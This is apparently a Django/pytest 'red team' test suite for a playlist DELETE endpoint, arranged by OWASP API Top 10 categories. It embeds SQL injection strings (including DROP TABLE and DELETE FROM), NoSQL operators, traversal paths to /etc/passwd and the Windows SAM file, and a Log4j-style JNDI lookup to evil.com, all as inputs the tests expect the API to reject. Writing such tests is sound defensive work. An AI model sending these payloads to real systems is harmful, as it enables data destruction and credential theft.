"""Red Team security tests for Playlists DELETE endpoint (T226).

Tests focus on finding vulnerabilities using OWASP API Top 10 methodology:
- API1:2023 Broken Object Level Authorization (BOLA/IDOR)
- API3:2023 Broken Object Property Level Authorization (BOPLA)
- API5:2023 Broken Function Level Authorization (BFLA)
- API8:2023 Security Misconfiguration
- Injection attacks (SQLi, NoSQLi)
"""

import json
import time

from concurrent.futures import ThreadPoolExecutor

import pytest

from model_bakery import baker

from api.core.models import User
from api.schedule.models import Playlist
from api.storage.models import File


@pytest.mark.django_db(transaction=True)
class TestPlaylistDeleteRedTeam:
    """Red Team tests for DELETE /api/v2/playlists/{id} security."""

    def setup_method(self):
        """Clean up before each test."""
        Playlist.objects.all().delete()
        File.objects.filter(owner__username__startswith="testred").delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API1:2023 - BOLA (Broken Object Level Authorization)
    # ========================================================================

    @pytest.mark.xfail(reason="T420: BOLA vulnerability - no owner filtering")
    def test_bola_delete_other_users_playlist_fails(self, guest_client):
        """BOLA: User should NOT be able to delete another user's playlist."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        playlist = baker.make(
            Playlist,
            name="Victim's Private Playlist",
            owner=victim,
        )

        # Attacker tries to delete victim's playlist
        # Expected: 403 or 404 (should not be visible/deletable)
        # Actual: 204 (BOLA vulnerability)
        response = guest_client.delete(f"/api/v2/playlists/{playlist.id}")
        assert response.status_code in [
            403,
            404,
        ], f"BOLA: Attacker deleted victim's playlist with status {response.status_code}"
        assert Playlist.objects.filter(
            id=playlist.id,
        ).exists(), "BOLA: Victim's playlist was deleted by attacker"

    @pytest.mark.xfail(reason="T420: BOLA vulnerability - no owner filtering")
    def test_bola_delete_multiple_other_users_playlists(self, guest_client):
        """BOLA: Mass deletion of other users' playlists should fail."""
        victims = [
            baker.make(User, username=f"testred_victim_{i}") for i in range(5)
        ]
        playlists = [
            baker.make(Playlist, name=f"Victim Playlist {i}", owner=victims[i])
            for i in range(5)
        ]
        playlist_ids = [p.id for p in playlists]

        # Attacker tries to delete all victims' playlists
        for pid in playlist_ids:
            guest_client.delete(f"/api/v2/playlists/{pid}")

        # All playlists should still exist
        remaining = Playlist.objects.filter(id__in=playlist_ids).count()
        assert (
            remaining == 5
        ), f"BOLA: Attacker deleted {5 - remaining} victim playlists"

    @pytest.mark.xfail(reason="T420: BOLA vulnerability - ID predictable")
    def test_bola_id_prediction_delete_sequential(self, guest_client):
        """BOLA: Sequential ID prediction enables mass BOLA attacks."""
        victim = baker.make(User, username="testred_victim")

        # Create victim's playlists
        playlists = [
            baker.make(Playlist, name=f"Victim Playlist {i}", owner=victim)
            for i in range(3)
        ]

        # Attacker predicts sequential IDs and tries to delete
        base_id = playlists[0].id
        for offset in range(-5, 10):
            predicted_id = base_id + offset
            guest_client.delete(f"/api/v2/playlists/{predicted_id}")

        # All victim playlists should still exist
        for playlist in playlists:
            assert Playlist.objects.filter(
                id=playlist.id,
            ).exists(), (
                f"BOLA: Predicted ID attack deleted playlist {playlist.id}"
            )

    # ========================================================================
    # API3:2023 - BOPLA (Broken Object Property Level Authorization)
    # ========================================================================

    @pytest.mark.xfail(reason="T420: Mass assignment vulnerability")
    def test_bopla_mass_assignment_via_delete_response(self, guest_client):
        """BOPLA: Check if delete response leaks sensitive fields."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(
            Playlist,
            name="Test Playlist",
            description="Test Description",
            owner=user,
        )

        # Delete and check response doesn't leak internal fields
        response = guest_client.delete(f"/api/v2/playlists/{playlist.id}")

        # Response should be empty (204)
        # If it contains data, check for sensitive field leakage
        if response.content:
            data = response.json() if response.content else {}
            sensitive_fields = ["password", "token", "secret", "internal_id"]
            for field in sensitive_fields:
                assert (
                    field not in data
                ), f"BOPLA: Sensitive field '{field}' leaked in delete response"

    # ========================================================================
    # Injection Attacks
    # ========================================================================

    def test_sqli_delete_id_union_select(self, guest_client):
        """SQLi: UNION SELECT in ID parameter should not work."""
        sql_payloads = [
            "1 UNION SELECT * FROM users",
            "1; DROP TABLE cc_playlist;--",
            "1' OR '1'='1",
            "1' AND 1=1--",
            "1'; DELETE FROM cc_playlist WHERE '1'='1",
            "1) OR (1=1",
            "1)) OR ((1=1",
        ]

        for payload in sql_payloads:
            response = guest_client.delete(f"/api/v2/playlists/{payload}")
            # Should return 404 (not found) or 400 (bad request)
            # Should NOT execute SQL or return 500
            assert response.status_code in [
                400,
                404,
                405,
            ], f"SQLi: Payload '{payload}' caused status {response.status_code}"

    def test_nosql_injection_delete(self, guest_client):
        """NoSQLi: MongoDB-style operators in ID should not work."""
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.id > 0"}',
            '{"$in": [1, 2, 3]}',
        ]

        for payload in nosql_payloads:
            response = guest_client.delete(f"/api/v2/playlists/{payload}")
            # Should return 404 or 400, never succeed
            assert response.status_code in [
                400,
                404,
            ], f"NoSQLi: Payload '{payload}' caused status {response.status_code}"

    def test_path_traversal_delete(self, guest_client):
        """Path traversal: Directory traversal in ID should not work."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]

        for payload in traversal_payloads:
            response = guest_client.delete(f"/api/v2/playlists/{payload}")
            assert response.status_code in [
                400,
                404,
            ], f"Traversal: Payload '{payload}' caused status {response.status_code}"

    # ========================================================================
    # API6:2023 - Unrestricted Resource Consumption
    # ========================================================================

    def test_delete_rate_limiting(self, guest_client):
        """Resource consumption: Rapid delete requests should be rate limited."""
        user = baker.make(User, username="testred_user")

        # Create many playlists
        playlists = [
            baker.make(Playlist, name=f"Playlist {i}", owner=user)
            for i in range(20)
        ]

        # Attempt rapid deletion
        start_time = time.time()
        responses = []
        for playlist in playlists:
            response = guest_client.delete(f"/api/v2/playlists/{playlist.id}")
            responses.append(response.status_code)

        elapsed = time.time() - start_time

        # Check for rate limiting (429) or all successful (204)
        # If all 20 succeeded instantly, might indicate no rate limiting
        # This is informational only - not a strict failure
        if elapsed < 1.0 and all(r == 204 for r in responses):
            pass  # No rate limiting detected (informational)

    def test_delete_non_numeric_id_performance(self, guest_client):
        """Resource consumption: Complex ID should not cause DoS."""
        # Very long ID that might cause regex backtracking
        long_id = "A" * 10000

        start_time = time.time()
        response = guest_client.delete(f"/api/v2/playlists/{long_id}")
        elapsed = time.time() - start_time

        # Should return quickly (< 2 seconds)
        assert elapsed < 2.0, f"DoS: Long ID caused {elapsed}s response time"
        assert response.status_code in [
            400,
            404,
        ], f"Unexpected status for long ID: {response.status_code}"

    # ========================================================================
    # API8:2023 - Security Misconfiguration
    # ========================================================================

    def test_delete_http_method_override(self, client):
        """Security misconfig: DELETE via method override should respect auth."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        # Try to override GET with DELETE
        response = client.get(
            f"/api/v2/playlists/{playlist.id}",
            headers={
                "X-HTTP-Method-Override": "DELETE",
                "X-HTTP-Method": "DELETE",
                "_method": "delete",
            },
        )

        # Either should not delete (200/403) or respect auth
        # If it deletes, that's a critical vulnerability
        if response.status_code == 204:
            assert (
                False
            ), "CRITICAL: Method override bypassed auth and deleted resource"

        # Playlist should still exist
        assert Playlist.objects.filter(
            id=playlist.id,
        ).exists(), "Method override deleted playlist without proper auth"

    def test_delete_with_trace_method(self, guest_client):
        """Security misconfig: TRACE method should not delete."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        # Try TRACE request (should not delete)
        response = guest_client.trace(f"/api/v2/playlists/{playlist.id}")

        # TRACE should not be allowed or should not delete
        assert response.status_code in [
            405,
            501,
        ], f"TRACE method returned {response.status_code}"

        # Playlist should still exist
        assert Playlist.objects.filter(
            id=playlist.id,
        ).exists(), "TRACE method deleted the playlist"

    # ========================================================================
    # Business Logic Bypasses
    # ========================================================================

    @pytest.mark.xfail(reason="T420: No ownership verification")
    def test_delete_after_ownership_transfer(self, guest_client):
        """Business logic: Delete after ownership change should fail for old owner."""
        original_owner = baker.make(User, username="testred_original")
        new_owner = baker.make(User, username="testred_new")

        playlist = baker.make(
            Playlist,
            name="Test Playlist",
            owner=original_owner,
        )

        # Transfer ownership (if BOPLA allows it)
        guest_client.patch(
            f"/api/v2/playlists/{playlist.id}",
            json.dumps({"owner": new_owner.id}),
            content_type="application/json",
        )

        # Original owner should NOT be able to delete anymore
        # (Assuming we could authenticate as original owner)
        response = guest_client.delete(f"/api/v2/playlists/{playlist.id}")

        # If ownership transfer worked, original owner shouldn't delete
        # This test documents expected behavior after fix
        # Placeholder for complex auth scenario

    def test_double_delete_race_condition(self, guest_client):
        """Race condition: Simultaneous delete requests."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        def delete_attempt():
            return guest_client.delete(f"/api/v2/playlists/{playlist.id}")

        # Fire two concurrent delete requests
        with ThreadPoolExecutor(max_workers=2) as executor:
            future1 = executor.submit(delete_attempt)
            future2 = executor.submit(delete_attempt)
            response1 = future1.result()
            response2 = future2.result()

        # One should succeed (204), one should fail (404)
        statuses = {response1.status_code, response2.status_code}
        assert (
            statuses == {204, 404} or statuses == {204} or statuses == {404}
        ), f"Race condition: got statuses {statuses}"

    # ========================================================================
    # Edge Cases and Input Validation
    # ========================================================================

    def test_delete_unicode_id(self, guest_client):
        """Input validation: Unicode characters in ID should be rejected."""
        unicode_ids = [
            "test\u0000",  # Null byte
            "test\n",  # Newline
            "test\r",  # Carriage return
            "日本語",  # Japanese
            "<script>",  # XSS attempt
            "'--",  # SQL comment
        ]

        for uid in unicode_ids:
            response = guest_client.delete(f"/api/v2/playlists/{uid}")
            assert response.status_code in [
                400,
                404,
            ], f"Unicode ID '{repr(uid)}' caused {response.status_code}"

    def test_delete_boolean_id(self, guest_client):
        """Input validation: Boolean-like IDs should be rejected."""
        bool_ids = [
            "true",
            "false",
            "True",
            "False",
            "TRUE",
            "FALSE",
            "1",
            "0",
        ]

        for bid in bool_ids:
            response = guest_client.delete(f"/api/v2/playlists/{bid}")
            assert response.status_code in [
                400,
                404,
            ], f"Boolean ID '{bid}' caused {response.status_code}"

    def test_delete_null_and_empty(self, guest_client):
        """Input validation: null and empty ID handling."""
        # Null ID (trailing slash)
        response = guest_client.delete("/api/v2/playlists/null")
        assert response.status_code == 404

        # Empty ID (double slash)
        response = guest_client.delete("/api/v2/playlists/")
        # This might hit list endpoint instead
        assert response.status_code in [200, 405, 404]

    # ========================================================================
    # Information Disclosure
    # ========================================================================

    def test_delete_error_message_information_disclosure(self, guest_client):
        """Info disclosure: Error messages should not leak internal details."""
        # Try to delete with various malformed IDs
        test_ids = [
            "1'",
            '1"',
            "1;",
            "../../",
            "${jndi:ldap://evil.com}",  # Log4j-style
        ]

        for tid in test_ids:
            response = guest_client.delete(f"/api/v2/playlists/{tid}")
            if response.status_code >= 400:
                content = response.content.decode().lower()
                # Check for information leakage
                leaks = [
                    "sql",
                    "sqlite",
                    "postgresql",
                    "mysql",
                    "django",
                    "traceback",
                    "exception",
                    "password",
                    "secret",
                    "key",
                ]
                for leak in leaks:
                    assert (
                        leak not in content
                    ), f"Info leak: '{leak}' found in error response for ID '{tid}'"

    def test_delete_timing_attack(self, guest_client):
        """Timing attack: Response time should not reveal existence."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        # Time request for existing playlist
        start = time.time()
        guest_client.delete(f"/api/v2/playlists/{playlist.id}")
        time_existing = time.time() - start

        # Time request for non-existing playlist
        start = time.time()
        guest_client.delete("/api/v2/playlists/999999")
        time_nonexistent = time.time() - start

        # Times should be similar (no oracle)
        diff = abs(time_existing - time_nonexistent)
        assert (
            diff < 0.5
        ), f"Timing attack: {diff}s difference between existing/non-existing"